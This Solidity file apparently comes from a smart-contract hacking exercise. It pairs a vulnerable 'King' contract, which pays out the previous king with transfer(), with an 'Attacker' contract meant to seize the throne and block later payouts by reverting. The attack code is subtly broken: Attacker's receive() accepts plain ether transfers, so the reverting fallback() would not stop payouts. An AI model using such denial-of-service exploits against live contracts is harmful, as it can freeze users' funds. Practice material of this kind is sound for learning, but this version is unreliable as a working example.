// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    console.log('receive king');
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Attacker {

    function attack(address _contractKing) public payable {
        (bool sent, ) = address(_contractKing).call{value: msg.value}("");
        console.log(sent);
    }

    fallback() external payable {
        console.log('fallback attacker');
        revert();
    }

    receive() external payable{
        console.log('receive attacker');
    }
}